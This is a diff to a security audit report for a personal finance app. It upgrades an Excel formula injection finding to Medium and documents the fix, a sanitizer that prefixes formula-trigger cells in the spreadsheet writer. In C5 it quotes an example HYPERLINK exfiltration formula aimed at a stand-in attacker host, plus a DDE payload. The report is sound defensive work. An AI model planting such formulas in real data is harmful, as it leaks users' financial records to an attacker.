@@ -13,7 +13,7 @@
 | C2 | core | No brute-force protection / rate limiting on Basic auth | Medium — ✅ Fixed |
 | C3 | core | Database connection defaults to `sslmode=disable` (incl. prod docs) | Medium — ⏸️ Accepted (local DB) |
 | C4 | core | SSRF via stored push-subscription endpoint | Low — ✅ Fixed |
-| C5 | core | Excel formula injection in transaction export | Low/Info |
+| C5 | core | Excel formula injection in transaction export (untrusted SMS-derived notes) | Medium — ✅ Fixed |
 | L1 | lookout | Ingest token optional + delivered over plaintext HTTP to core | Medium |
 | L2 | lookout | Telegram session stored as plaintext JSON on disk | Low |
 | N1 | notifier | `allowBackup="true"` with default (empty) backup rules | Low |
@@ -72,12 +72,14 @@ DB credentials and all financial data traverse the network in cleartext. Even on
 
 **✅ Fixed (2026-06-26):** `SubscribePush` now runs `validatePushEndpoint` (`core/internal/http/handlers/push.go`) before storing. It requires an `https` URL whose host is a **recognized browser push service** — an allowlist of `fcm.googleapis.com`, `android.googleapis.com`, `push.services.mozilla.com`, `push.apple.com`, and `notify.windows.com` (exact host or subdomain). Everything else — IP literals, internal hostnames, and look-alike domains (`fcm.googleapis.com.evil.example`, `evilfcm.googleapis.com`) — is rejected. Because the host must be one of these trusted providers, the server can never be coerced into fetching internal infrastructure, and no DNS lookup is needed in the request path. Covered by `push_test.go`. Trade-off: a browser using a push host outside the list would be refused subscription; extend `allowedPushHosts` if a new provider appears.
 
-### C5 — Excel formula injection in export (Low/Info)
+### C5 — Excel formula injection in export (Medium)
 `core/internal/http/handlers/transactions_export.go:82`
 
-User-controlled `note` (and category name) are written into `.xlsx` cells. The merchant/note text originates from ingested bank messages, which are externally influenced. `excelize` writes these as string-typed cells (not formulas), so the common risk is mitigated, but a value beginning with `=`, `+`, `-`, or `@` can still be interpreted as a formula by some spreadsheet apps on open.
+The exported `note` column is populated from **merchant strings parsed out of bank SMS / Telegram notifications** — externally-controlled input, not the trusted operator's own data. A crafted merchant name such as `=HYPERLINK("http://attacker/?leak="&A1)` or a `=cmd|…` DDE payload flows through ingest into a transaction note, and when the operator opens the `.xlsx` export some spreadsheet apps evaluate it. Because the attacker controls the message text, this is a realistic injection path, not a theoretical one — hence Medium rather than Info.
 
-**Recommendation:** Prefix cells whose value starts with a formula trigger character with a leading apostrophe / zero-width guard before writing.
+**Recommendation:** Prefix cells whose value starts with a formula trigger character with a leading apostrophe / text guard before writing.
+
+**✅ Fixed (2026-06-26):** Neutralized centrally in the spreadsheet writer (`core/pkg/xlsx/xlsx.go`): `AppendRow` now runs every cell through `sanitizeCell`, which prefixes a single quote (the spreadsheet text marker) to any **string** value beginning with a formula trigger (`= + - @`, tab, or CR). Numeric/date cells pass through untouched, so the Amount column keeps its type and formatting. Applying it in the writer protects this export and any future one. Covered by `TestWorkbook_NeutralizesFormulaInjection` in `core/pkg/xlsx/xlsx_test.go`.
 
 **Positives:** All SQL uses parameterized queries / placeholders, including the dynamic filter builder in `transaction_repository.List` (no SQL injection). Money is integer minor units. The container runs as non-root (`USER app`, uid 10001). CORS is locked to a single configured origin with no credential wildcard. `chi` `Recoverer` is installed.
 
